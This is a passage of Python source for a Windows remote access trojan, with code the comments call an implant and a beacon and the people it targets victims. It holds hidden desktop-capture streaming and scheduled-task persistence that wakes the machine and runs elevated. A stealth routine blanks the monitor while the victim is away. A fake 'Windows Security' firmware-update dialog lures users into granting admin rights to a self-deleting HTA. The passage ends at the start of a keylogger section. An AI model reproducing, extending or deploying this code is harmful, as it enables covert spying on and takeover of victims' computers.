
    class BMI(ctypes.Structure):
        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]

    def new_bgra(w, h):
        bmi = BMI()
        bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
        bmi.bmiHeader.biWidth, bmi.bmiHeader.biHeight = w, -h
        bmi.bmiHeader.biPlanes, bmi.bmiHeader.biBitCount = 1, 32
        hdc = u32.GetDC(None)
        mem = g32.CreateCompatibleDC(hdc)
        bmp = g32.CreateCompatibleBitmap(hdc, w, h)
        g32.SelectObject(mem, bmp)
        u32.ReleaseDC(None, hdc)
        return mem, bmp, bmi

    SRCCOPY = 0x00CC0020
    RGN_DIFF, NULLREGION = 4, 1

    def is_capturable(h):
        if not u32.IsWindowVisible(h) or u32.IsIconic(h):
            return False
        r = wintypes.RECT()
        if not u32.GetWindowRect(h, ctypes.byref(r)):
            return False
        if r.right - r.left < 40 or r.bottom - r.top < 40:
            return False
        cloaked = ctypes.c_int(0)
        dwm.DwmGetWindowAttribute(h, 14, ctypes.byref(cloaked), 4)
        if cloaked.value:
            return False
        t = ctypes.create_unicode_buffer(64)
        u32.GetClassNameW(h, t, 64)
        if t.value.startswith("nvo"):  # our overlay window(s) - excluded by design
            return False
        # viewer feedback loop: a browser showing the netvnc viewer page on
        # this same desktop would recurse into the stream (infinite mirror)
        tt = ctypes.create_unicode_buffer(256)
        u32.GetWindowTextW(h, tt, 256)
        if "netvnc viewer" in tt.value.lower():
            return False
        return True

    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    frame_len = W * H * 4
    frame_buf = ctypes.create_string_buffer(frame_len)

    class CURSORINFO(ctypes.Structure):
        _fields_ = [("cbSize", wintypes.DWORD), ("flags", wintypes.DWORD),
                    ("hCursor", wintypes.HANDLE),
                    ("ptScreenPos", wintypes.POINT)]

    # ---- named pipe server (multi-instance, overlapped accept) ----
    PIPE_ACCESS_OUTBOUND = 0x00000002
    PIPE_UNLIMITED_INSTANCES = 255
    ERROR_PIPE_CONNECTED = 535
    ERROR_IO_PENDING = 997
    WAIT_OBJECT_0 = 0
    INFINITE = 0xFFFFFFFF

    k32.CreateNamedPipeW.restype = ctypes.c_void_p
    k32.CreateNamedPipeW.argtypes = (
        wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
        wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID)
    k32.ConnectNamedPipe.argtypes = (ctypes.c_void_p, wintypes.LPVOID)
    k32.DisconnectNamedPipe.argtypes = (ctypes.c_void_p,)
    k32.CreateEventW.restype = ctypes.c_void_p
    k32.CreateEventW.argtypes = (wintypes.LPVOID, wintypes.BOOL,
                                 wintypes.BOOL, wintypes.LPCWSTR)
    k32.SetEvent.argtypes = (ctypes.c_void_p,)
    k32.WaitForMultipleObjects.restype = ctypes.c_uint
    k32.WaitForMultipleObjects.argtypes = (
        wintypes.DWORD, ctypes.POINTER(ctypes.c_void_p), wintypes.BOOL,
        wintypes.DWORD)
    k32.WriteFile.argtypes = (ctypes.c_void_p, ctypes.c_char_p, wintypes.DWORD,
                              ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID)

    class OVERLAPPED(ctypes.Structure):
        _fields_ = [("Internal", ctypes.POINTER(ctypes.c_ulong)),
                    ("InternalHigh", ctypes.POINTER(ctypes.c_ulong)),
                    ("Offset", wintypes.DWORD), ("OffsetHigh", wintypes.DWORD),
                    ("hEvent", ctypes.c_void_p)]

    INVALID = ctypes.c_void_p(-1).value
    stop_evt = k32.CreateEventW(None, True, False, None)
    conns = []
    conns_lock = threading.Lock()

    def accept_loop():
        ev = k32.CreateEventW(None, True, False, None)
        handles = (ctypes.c_void_p * 2)(ev, stop_evt)
        while _under_srv["run"]:
            h = k32.CreateNamedPipeW(
                _UNDER_PIPE, PIPE_ACCESS_OUTBOUND, 0, PIPE_UNLIMITED_INSTANCES,
                0, 1 << 20, 0, None)
            if not h or h == INVALID:
                time.sleep(0.5)
                continue
            ov = OVERLAPPED()
            ov.hEvent = ev
            connected = False
            if k32.ConnectNamedPipe(h, ctypes.byref(ov)):
                connected = True
            else:
                err = k32.GetLastError()
                if err == ERROR_PIPE_CONNECTED:
                    connected = True
                elif err == ERROR_IO_PENDING:
                    if k32.WaitForMultipleObjects(2, handles, False,
                                                  INFINITE) == WAIT_OBJECT_0:
                        connected = True
                    else:
                        k32.CloseHandle(h)
                        break
                else:
                    k32.CloseHandle(h)
                    continue
            if connected:
                with conns_lock:
                    conns.append(h)

    def capture_loop():
        nonlocal W, H, frame_len, frame_buf
        # THIS thread does all drawing/measuring: new threads inherit the
        # PROCESS dpi context, not the creating thread's, so re-apply
        # per-monitor awareness here. Otherwise GetWindowRect/GetDC are
        # virtualized while W,H (measured above) are physical -> windows
        # drawn small into the top-left of an oversized bitmap, black around
        # (the "stream not filling the frame" bug).
        u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))
        W2, H2 = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
        if (W2, H2) != (W, H):
            W, H = W2, H2
            _under_srv["w"], _under_srv["h"] = W, H
            try:
                with open(_under_meta_path(), "w") as fh:
                    fh.write('{"w": %d, "h": %d}' % (W, H))
            except Exception:
                pass
        frame_len = W * H * 4
        frame_buf = ctypes.create_string_buffer(frame_len)
        mem, bmp, bmi = new_bgra(W, H)
        dc_cache = {}
        visible = []          # (hwnd, rect, visible_rgn) top->bottom
        cull_at = 0.0
        interval = 1.0 / _UNDER_FPS
        while _under_srv["run"]:
            t0 = time.perf_counter()
            if t0 >= cull_at:
                # geometry self-heal: resolution/monitor changes after startup
                # would leave windows drawn into a stale-size bitmap (content
                # top-left, rest black). Re-measure and rebuild everything,
                # then republish under.json so the streamer restarts with the
                # matching -s.
                W2, H2 = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
                if (W2, H2) != (W, H):
                    W, H = W2, H2
                    _under_srv["w"], _under_srv["h"] = W, H
                    frame_len = W * H * 4
                    frame_buf = ctypes.create_string_buffer(frame_len)
                    g32.DeleteObject(bmp)
                    g32.DeleteDC(mem)
                    mem, bmp, bmi = new_bgra(W, H)
                    for _stale in list(dc_cache):
                        _wmem, _wbmp, _wbmi = dc_cache.pop(_stale)
                        g32.DeleteObject(_wbmp)
                        g32.DeleteDC(_wmem)
                    for _, _, _rgn in visible:
                        g32.DeleteObject(_rgn)
                    visible = []
                    try:
                        with open(_under_meta_path(), "w") as fh:
                            fh.write('{"w": %d, "h": %d}' % (W, H))
                    except Exception:
                        pass
                # occlusion culling: visible region = rect minus union of
                # everything above it in z-order
                order = []

                @CB
                def cb(hwnd, lp):
                    order.append(hwnd)
                    return True

                u32.EnumWindows(cb, 0)
                newvis = []
                for hwnd in order:            # top -> bottom
                    if not is_capturable(hwnd):
                        continue
                    r = wintypes.RECT()
                    u32.GetWindowRect(hwnd, ctypes.byref(r))
                    if r.right <= 0 or r.bottom <= 0 or r.left >= W or r.top >= H:
                        continue
                    rgn = g32.CreateRectRgn(r.left, r.top,
                                            min(r.right, W), min(r.bottom, H))
                    for _, _, above in newvis:
                        g32.CombineRgn(rgn, rgn, above, RGN_DIFF)
                    box = wintypes.RECT()
                    if g32.GetRgnBox(rgn, ctypes.byref(box)) == NULLREGION:
                        g32.DeleteObject(rgn)
                        continue
                    newvis.append((hwnd, r, rgn))
                live = {h for h, _, _ in newvis}
                for h in list(dc_cache):
                    if h not in live:
                        wmem, wbmp, _wbmi = dc_cache.pop(h)
                        g32.DeleteObject(wbmp)
                        g32.DeleteDC(wmem)
                for _, _, rgn in visible:
                    g32.DeleteObject(rgn)
                visible = newvis
                cull_at = t0 + 2.0
            # composite bottom -> top, clipped to each window's visible region
            for hwnd, r, rgn in reversed(visible):
                if not u32.IsWindow(hwnd):
                    continue
                w = min(r.right - r.left, W)
                h = min(r.bottom - r.top, H)
                ent = dc_cache.get(hwnd)
                if not ent:
                    ent = new_bgra(w, h)
                    dc_cache[hwnd] = ent
                wmem, _wbmp, _wbmi = ent
                if u32.PrintWindow(hwnd, wmem, 2):   # PW_RENDERFULLCONTENT
                    g32.SelectClipRgn(mem, rgn)
                    g32.BitBlt(mem, r.left, r.top, w, h, wmem, 0, 0, SRCCOPY)
                    g32.SelectClipRgn(mem, None)
            # draw the real cursor so remote control stays visually aligned
            cur = CURSORINFO()
            cur.cbSize = ctypes.sizeof(cur)
            if u32.GetCursorInfo(ctypes.byref(cur)) and (cur.flags & 1) and cur.hCursor:
                u32.DrawIconEx(mem, cur.ptScreenPos.x, cur.ptScreenPos.y,
                               cur.hCursor, 0, 0, 0, None, 1)   # DI_NORMAL
            g32.GetDIBits(mem, bmp, 0, H, frame_buf, ctypes.byref(bmi), 0)
            data = frame_buf.raw
            with conns_lock:
                alive = []
                for h in conns:
                    written = wintypes.DWORD(0)
                    if k32.WriteFile(h, data, frame_len,
                                     ctypes.byref(written), None) \
                            and written.value == frame_len:
                        alive.append(h)
                    else:
                        k32.DisconnectNamedPipe(h)
                        k32.CloseHandle(h)
                conns[:] = alive
            delay = interval - (time.perf_counter() - t0)
            if delay > 0:
                time.sleep(delay)
        for _h, ent in dc_cache.items():
            g32.DeleteObject(ent[1])
            g32.DeleteDC(ent[0])
        g32.DeleteObject(bmp)
        g32.DeleteDC(mem)

    acc = threading.Thread(target=accept_loop, daemon=True)
    cap = threading.Thread(target=capture_loop, daemon=True)
    acc.start()
    cap.start()
    while _under_srv["run"]:
        time.sleep(0.25)
    k32.SetEvent(stop_evt)
    with conns_lock:
        for h in conns:
            k32.DisconnectNamedPipe(h)
            k32.CloseHandle(h)
        conns.clear()
    acc.join(timeout=3)


def _wake_flag() -> str:
    return os.path.join(_stream_state_path(), "wake.armed")


def _wake_armed() -> bool:
    return os.path.exists(_wake_flag())


def _register_wake_task(install_path: str, minutes: int = 0,
                        highest: bool = False,
                        delay_secs: int = 0) -> bool:
    """Re-register the persistence task with <WakeToRun> plus an optional
    one-shot time trigger (minutes > 0, or delay_secs > 0 for a
    finer-grained kick). highest=True pins <RunLevel>HighestAvailable</RunLevel> so
    admin-group users respawn elevated with no UAC prompt (registration
    itself needs no elevation). Same in-process COM sequence as
    _create_task - no schtasks.exe child, no PowerShell."""
    try:
        import ctypes
        import xml.sax.saxutils as _sx
        from datetime import datetime, timedelta
        handles = _ts_open()
        if not handles:
            return False
        svc, folder = handles
        try:
            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
                                         os.environ.get("USERNAME", "")))
            trig = "<LogonTrigger><UserId>%s</UserId></LogonTrigger>" % uid
            if delay_secs > 0 or minutes > 0:
                when = (datetime.now() + timedelta(
                    seconds=delay_secs if delay_secs > 0 else minutes * 60)
                ).strftime("%Y-%m-%dT%H:%M:%S")
                trig += ("<TimeTrigger><StartBoundary>%s</StartBoundary>"
                         "<Enabled>true</Enabled></TimeTrigger>" % when)
            xml = (
                '<?xml version="1.0" encoding="UTF-16"?>'
                '<Task version="1.2" '
                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                '<Triggers>%s</Triggers>'
                '<Principals><Principal id="Author"><UserId>%s</UserId>'
                '<LogonType>InteractiveToken</LogonType>%s</Principal></Principals>'
                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
                '<StartWhenAvailable>true</StartWhenAvailable>'
                '<WakeToRun>true</WakeToRun>'
                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
                '</Task>'
            ) % (trig, uid,
                 "<RunLevel>HighestAvailable</RunLevel>" if highest else "",
                 _sx.escape(install_path))
            VARIANT = _variant_type()
            reg = _com_slot(folder, 16,
                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.c_long, ctypes.POINTER(VARIANT),
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            v = VARIANT()
            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
            _com_release(out)
            return True
        finally:
            _ts_release(svc, folder)
    except Exception:
        return False


def _wake_arm() -> str:
    with open(_wake_flag(), "w") as f:
        f.write("1")
    if _register_wake_task(_persistence_exe(), 0, highest=True):
        return "[+] wake armed (task registered with WakeToRun)"
    return "[+] wake armed (flag set; task re-register failed)"


def _loader_exe_path() -> str:
    """Installed loader exe path (RAT_SOURCE=1 mode). The loader owns
    persistence: it copies itself to %USERPROFILE%\\.cache\\<name> and on
    every run re-fetches client.py + boots python from RAM. Only that exe
    can re-boot the implant - the embedded python.exe is useless without
    the script piped on stdin."""
    root = os.environ.get("RAT_PYROOT") or _base_dir()
    if not root:
        return ""
    # loader_py v3 hardcodes INSTALL_NAME=helper.exe - prefer it, then the
    # legacy self-install names (runtime.exe/updater.exe) as fallback.
    names = ["helper.exe"] + [n for n in INSTALL_NAME_CANDIDATES
                              if n.lower() != "helper.exe"]
    for name in names:
        p = os.path.join(root, INSTALL_DIR_NAME, name)
        if os.path.exists(p):
            return p
    return ""


def _persistence_exe() -> str:
    """Path the persistence task should run. Under RAT_SOURCE=1 (loader
    mode) GetModuleFileNameW(NULL) resolves to the temporary python.exe in
    the loader's pyXXXXXXXX dir, which the loader deletes - re-registering
    the task to that path would brick persistence. Prefer the LOADER exe
    recorded in the existing task's XML; fall back to the installed loader
    exe, then the module path."""
    if os.name != "nt" or os.environ.get("RAT_SOURCE") != "1":
        return _module_exe_path()
    fallback = lambda: _loader_exe_path() or _module_exe_path()
    try:
        import ctypes
        import re
        import xml.sax.saxutils as _sx
        handles = _ts_open()
        if not handles:
            return fallback()
        svc, folder = handles
        try:
            get = _com_slot(folder, 13, ctypes.c_wchar_p,   # ITaskFolder::GetTask
                            ctypes.POINTER(ctypes.c_void_p))
            task = ctypes.c_void_p()
            if get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
                   ctypes.byref(task)) != 0 or not task.value:
                return fallback()
            try:
                xml_get = _com_slot(task, 19,        # IRegisteredTask::get_Xml
                                    ctypes.POINTER(ctypes.c_void_p))
                bstr = ctypes.c_void_p()
                if xml_get(task, ctypes.byref(bstr)) != 0 or not bstr.value:
                    return fallback()
                try:
                    xml = ctypes.cast(bstr, ctypes.c_wchar_p).value or ""
                finally:
                    ctypes.windll.oleaut32.SysFreeString(bstr)
                m = re.search(r"<Command>(.*?)</Command>", xml, re.S)
                if not m:
                    return fallback()
                path = _sx.unescape(
                    m.group(1), {"&quot;": '"', "&apos;": "'"})
                if path and os.path.exists(path):
                    return path
            finally:
                _com_release(task)
        finally:
            _ts_release(svc, folder)
    except Exception:
        pass
    return fallback()


def _elevate_respawn() -> str:
    """Legacy scheduled-task respawn. NOTE: a medium-IL process cannot
    register a HighestAvailable task (0x80070005), so this only works when
    already elevated. request_admin() no longer calls this - the elevated
    HTA launches the persistence exe directly with the elevated token."""
    if os.name != "nt":
        return "[!] Windows only"
    import ctypes
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            if _register_wake_task(_persistence_exe(), 0, highest=True):
                return ("[+] already elevated; task pinned to HighestAvailable "
                        "(no respawn needed)")
            return "[+] already elevated; task re-register failed"
    except Exception:
        pass
    exe = _persistence_exe()
    if not exe or not os.path.exists(exe):
        return "[!] respawn skipped: persistence exe not resolvable"
    if not _register_wake_task(exe, 0, highest=True, delay_secs=20):
        return "[!] HighestAvailable re-registration failed - session stays medium-IL"
    return ("[+] task re-registered (RunLevel=HighestAvailable, fires ~20s): this "
            "session drops now and the elevated one beacons in ~1-2 min")


def _idle_seconds() -> float:
    """Seconds since last physical input (GetLastInputInfo)."""
    import ctypes

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(lii)
    if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        return 0.0
    return max(0.0, (ctypes.windll.kernel32.GetTickCount()
                     - lii.dwTime) / 1000.0)


def _monitor_off() -> None:
    import ctypes
    u32 = ctypes.windll.user32
    u32.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, 2,   # SC_MONITORPOWER=2
                            2, 1000, ctypes.byref(ctypes.c_size_t()))


def _monitor_on() -> None:
    import ctypes
    u32 = ctypes.windll.user32
    u32.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, -1,  # SC_MONITORPOWER=-1
                            2, 1000, ctypes.byref(ctypes.c_size_t()))


def _sleep_now() -> None:
    import ctypes
    ctypes.windll.powrprof.SetSuspendState(False, False, False)


def _power_hook() -> None:
    """WM_POWERBROADCAST watcher: on suspend (wake armed) re-registers the
    task with a one-shot wake trigger; on resume with no user present it
    blanks the screen, kills the monitor and holds the system awake so the
    stream keeps running."""
    import ctypes
    u32 = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    u32.DefWindowProcW.restype = ctypes.c_ssize_t
    u32.DefWindowProcW.argtypes = (ctypes.c_void_p, ctypes.c_uint,
                                   ctypes.c_size_t, ctypes.c_ssize_t)
    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
                                 ctypes.c_uint, ctypes.c_size_t,
                                 ctypes.c_ssize_t)
    WM_POWERBROADCAST = 0x0218
    PBT_APMSUSPEND, PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC = 4, 7, 18

    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class MSG(ctypes.Structure):
        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
                    ("time", ctypes.c_uint), ("pt", POINT)]

    class WNDCLASSW(ctypes.Structure):
        _fields_ = [("style", ctypes.c_uint), ("lpfnWndProc", WNDPROC),
                    ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
                    ("hInstance", ctypes.c_void_p), ("hIcon", ctypes.c_void_p),
                    ("hCursor", ctypes.c_void_p),
                    ("hbrBackground", ctypes.c_void_p),
                    ("lpszMenuName", ctypes.c_wchar_p),
                    ("lpszClassName", ctypes.c_wchar_p)]

    def proc(hwnd, msg, wp, lp):
        if msg == WM_POWERBROADCAST:
            try:
                if wp == PBT_APMSUSPEND and _wake_armed():
                    _register_wake_task(_persistence_exe(), 1,
                                        highest=True)   # wake +1min
                elif (wp in (PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC)
                      and _wake_armed()):
                    time.sleep(2.0)
                    if _idle_seconds() > 30:   # victim still away
                        # full stealth: overlay + monitor off + keep-awake,
                        # auto-exits when the victim touches mouse/keyboard
                        threading.Thread(target=_stealth_on, args=("resume",),
                                         daemon=True).start()
            except Exception:
                pass
            return 1
        return u32.DefWindowProcW(hwnd, msg, wp, lp)

    _pw_refs["procs"] = _pw_refs.get("procs", []) + [WNDPROC(proc)]
    _pw_refs["proc"] = _pw_refs["procs"][-1]
    wc = WNDCLASSW()
    wc.lpfnWndProc = _pw_refs["proc"]
    wc.lpszClassName = "nvp"
    if not u32.RegisterClassW(ctypes.byref(wc)):
        if ctypes.windll.kernel32.GetLastError() != 1410:   # ERROR_CLASS_ALREADY_EXISTS
            return
    # plain (non message-only) hidden top-level window: message-only
    # windows never receive WM_POWERBROADCAST
    hwnd = u32.CreateWindowExW(0, "nvp", "nvp", 0, 0, 0, 0, 0,
                               None, None, None, None)
    if not hwnd:
        return
    m = MSG()
    while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
        u32.TranslateMessage(ctypes.byref(m))
        u32.DispatchMessageW(ctypes.byref(m))


def _start_power_hook() -> None:
    if os.name == "nt":
        threading.Thread(target=_power_hook, daemon=True,
                         name="pwrhook").start()


def _power_status() -> str:
    lines = []
    if os.name == "nt":
        import ctypes
        try:
            admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            admin = False
        lines.append("elevated: %s" % ("YES" if admin else "no"))
        lines.append("wake armed: %s" % ("yes" if _wake_armed() else "no"))
        lines.append("stealth: %s" % (
            "on (%s)" % _stealth_state["reason"] if _stealth_state["on"]
            else "off"))
        lines.append("idle: %.0fs" % _idle_seconds())
        try:
            out = subprocess.run("powercfg /getactivescheme", shell=True,
                                 capture_output=True, timeout=10,
                                 creationflags=subprocess.CREATE_NO_WINDOW)
            lines.append(out.stdout.decode("cp1252", errors="replace").strip())
        except Exception:
            pass
    return "\n".join(lines)


def _beacon_log(msg: str) -> None:
    """Append a timestamped line to the target-side admin log. Best-effort
    only - the implant must keep running even if logging fails."""
    try:
        from datetime import datetime
        d = os.path.join(_stream_state_path(), "nvdesk")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "admin.log"), "a", encoding="utf-8") as f:
            f.write("%s %s\r\n" % (datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                   msg))
    except Exception:
        pass


def _enable_crash_log() -> None:
    """Route unhandled Python exceptions + native faults (faulthandler) to
    crash.log next to the admin beacon log so failures are visible
    target-side. The loader feeds this script via stdin with no console or
    stderr, so an early silent death used to leave zero evidence;
    faulthandler additionally dumps every thread on an access violation
    (native crash / AV kill). Best-effort only - logging must never break
    the beacon."""
    try:
        d = os.path.join(_stream_state_path(), "nvdesk")
        os.makedirs(d, exist_ok=True)
        f = open(os.path.join(d, "crash.log"), "a", encoding="utf-8",
                 errors="replace")
        try:
            import faulthandler
            faulthandler.enable(file=f)
        except Exception:
            pass

        def _hook(tp, val, tb):
            try:
                from datetime import datetime
                f.write("\n=== %s unhandled %s: %s ===\n" % (
                    datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    getattr(tp, "__name__", tp), val))
                traceback.print_exception(tp, val, tb, file=f)
                f.flush()
            except Exception:
                pass
            sys.__excepthook__(tp, val, tb)   # keep default exit behavior

        sys.excepthook = _hook
        sys.stderr = f     # stray thread tracebacks/prints land in the log
    except Exception:
        pass


def _elev_launch_cmd() -> str:
    """Command line the elevated HTA must run to start a new elevated beacon.
    Returns "" if unresolvable (the HTA then logs NO_LAUNCH_CMD instead of
    calling sh.Run with an empty string).

    The frozen/onefile implant re-runs its own exe; a bare dev run
    (`python client.py`) must re-invoke the interpreter with the script path -
    otherwise _persistence_exe() resolves to python.exe and the elevated shell
    just opens an idle interpreter that never beacons."""
    if os.name != "nt":
        return ""
    frozen = getattr(sys, "frozen", False) or "__compiled__" in globals()
    if os.environ.get("RAT_SOURCE") == "1":
        # Loader mode: the implant is python.exe reading client.py from
        # stdin (source never on disk). A bare python.exe relaunch is
        # useless - launch the installed LOADER exe instead, which
        # re-fetches client.py and boots python elevated (same path as
        # on-logon persistence).
        exe = _loader_exe_path()
        if exe:
            exe = exe.strip().strip('"')
            if exe and os.path.exists(exe):
                return '"' + exe + '"'
        return ""
    if frozen:
        exe = _module_exe_path() or get_self_path()
        if exe and os.path.exists(exe):
            return '"' + exe + '"'
    exe = os.path.abspath(__file__)
    if os.path.exists(exe):
        return '"' + sys.executable + '" "' + exe + '"'
    return ""


def request_admin() -> str:
    """Spoofed-elevation chain: center-screen Windows Security pretext
    dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
    process) -> elevated HTA disables sleep console-lock, enables RTC wake,
    launches the persistence exe elevated (RAT_NOINSTALL=1 bypasses the
    loader's single-instance mutex, still owned by this session's loader),
    writes a proof flag and self-deletes. The medium-IL session then drops
    so the elevated beacon can connect. On success wake is auto-armed."""
    if os.name != "nt":
        return "[!] Windows only"
    import ctypes
    _beacon_log("[medium] request_admin: src=%s self=%s" % (
        os.environ.get("RAT_SOURCE", "0"), get_self_path()))
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            arm = _wake_arm()
            _beacon_log("[medium] already elevated, skipping UAC")
            return "[+] already elevated - no UAC prompt needed. " + arm
    except Exception:
        pass
    base = os.path.join(_stream_state_path(), "nvdesk")
    os.makedirs(base, exist_ok=True)
    flag = os.path.join(base, "elev.ok")
    _beacon_log("[medium] base=%s flag=%s" % (base, flag))
    try:
        os.remove(flag)
    except OSError:
        pass

    # MB_OKCANCEL | MB_ICONWARNING | MB_SYSTEMMODAL | MB_SETFOREGROUND |
    # MB_TOPMOST - centered modal, X/Cancel counts as dismissal too
    ctypes.windll.user32.MessageBoxW(
        None,
        "Battery firmware component needs update, Give administrator access "
        "to update now",
        "Windows Security",
        0x00000001 | 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000)

    _beacon_log("[medium] module_exe=%s self=%s" % (
        _module_exe_path(), get_self_path()))
    _beacon_log("[medium] persistence_exe=%s" % _persistence_exe())
    launch_cmd = _elev_launch_cmd()
    _beacon_log("[medium] launch_cmd=%s" % launch_cmd)
    launch_vbs = launch_cmd.replace('"', '""')

    hta = os.path.join(base, "uac.hta")
    log = os.path.join(base, "admin.log")
    log_vbs = log.replace('"', '""')
    flag_vbs = flag.replace('"', '""')
    hta_vbs = hta.replace('"', '""')
    if launch_cmd:
        launch_line = ('L "launch rc=" & sh.Run("%s", 0, False)\r\n'
                       % launch_vbs)
    else:
        launch_line = 'L "launch NO_LAUNCH_CMD"\r\n'
    vbs = (
        'On Error Resume Next\r\n'
        'Dim sh: Set sh = CreateObject("WScript.Shell")\r\n'
        'Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
        'Sub L(m)\r\n'
        '  Dim o\r\n'
        '  On Error Resume Next\r\n'
        '  Set o = fso.OpenTextFile("%(log)s", 8, True)\r\n'
        '  o.WriteLine CStr(Now) & " [elev] " & m\r\n'
        '  o.Close\r\n'
        'End Sub\r\n'
        'L "start"\r\n'
        'sh.Environment("Process")("RAT_FAST") = "1"\r\n'
        'L "RAT_FAST set"\r\n'
        "' RAT_NOINSTALL=1: our loader is already running (medium IL) and holds\r\n"
        "' the Local\\RuntimeUpdateTask_boot mutex, so a second instance would\r\n"
        "' exit silently at its mutex check. Skipping mutex+install lets the\r\n"
        "' elevated copy boot in parallel instead of dying on the spot.\r\n"
        'sh.Environment("Process")("RAT_NOINSTALL") = "1"\r\n'
        'L "RAT_NOINSTALL set"\r\n'
        'L "powercfg AC CONSOLELOCK 0 rc=" & '
        'sh.Run("powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
        'CONSOLELOCK 0", 0, True)\r\n'
        'L "powercfg DC CONSOLELOCK 0 rc=" & '
        'sh.Run("powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_NONE '
        'CONSOLELOCK 0", 0, True)\r\n'
        'L "powercfg AC RTCWAKE 1 rc=" & '
        'sh.Run("powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
        'RTCWAKE 1", 0, True)\r\n'
        'L "powercfg DC RTCWAKE 1 rc=" & '
        'sh.Run("powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
        'RTCWAKE 1", 0, True)\r\n'
        'L "powercfg SETACTIVE rc=" & '
        'sh.Run("powercfg /SETACTIVE SCHEME_CURRENT", 0, True)\r\n'
        '%(launch)s'
        'L "flag write"\r\n'
        'Dim f: Set f = fso.CreateTextFile("%(flag)s", True)\r\n'
        'f.Write "ok"\r\n'
        'f.Close\r\n'
        'L "flag written"\r\n'
        'fso.DeleteFile "%(hta)s", True\r\n'
        'L "done"\r\n'
        'Self.Close\r\n'
    ) % {"log": log_vbs, "flag": flag_vbs, "hta": hta_vbs,
         "launch": launch_line}
    with open(hta, "w", encoding="utf-16") as f:
        f.write("<html><head><hta:application id=\"a\" caption=\"no\" "
                "showintaskbar=\"no\"/></head>"
                "<script language=\"VBScript\">\n" + vbs + "</script></html>")

    rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", "mshta.exe",
                                             '"' + hta + '"', None, 0)
    _beacon_log("[medium] ShellExecuteW rc=%d hta=%s" % (rc, hta))
    if rc <= 32:
        try:
            os.remove(hta)
        except OSError:
            pass
        _beacon_log("[medium] elevation declined/failed rc=%d" % rc)
        return "[!] elevation declined/failed (ShellExecute rc=%d)" % rc
    for _ in range(240):                  # 120s for the victim to click Yes
        if os.path.exists(flag):
            break
        time.sleep(0.5)
    else:
        _beacon_log("[medium] flag not found within 120s")
        return "[-] elevation not confirmed within 120s"
    _beacon_log("[medium] flag found")
    try:
        os.remove(hta)
    except OSError:
        pass
    arm = _wake_arm()
    _beacon_log("[medium] wake_arm result: %s" % arm)
    _beacon_log("[medium] scheduled exit in 2.5s")
    msg = "[+] ELEVATED: console lock off, RTC wake on. " + arm
    # the elevated HTA already launched the persistence exe with the
    # elevated token; drop this medium-IL session so the listener can
    # accept the elevated beacon (retries every ~5s)
    threading.Timer(2.5, os._exit, args=(0,)).start()
    return (msg + "\n[+] elevated shell launched - this session drops now; "
            "the elevated beacon connects in ~10-30s")



# ===== KEYLOGGER =====
# WH_KEYBOARD_LL capture. Printable text is decoded through ToUnicodeEx
# with the active keyboard layout (dead keys / non-US layouts resolve
# correctly); modifier state is tracked from the hook itself so the decode
# is exact, and a US fallback covers keys the layout returns nothing for.
# Captured units accumulate in a rolling "line"; lines flush on Enter,
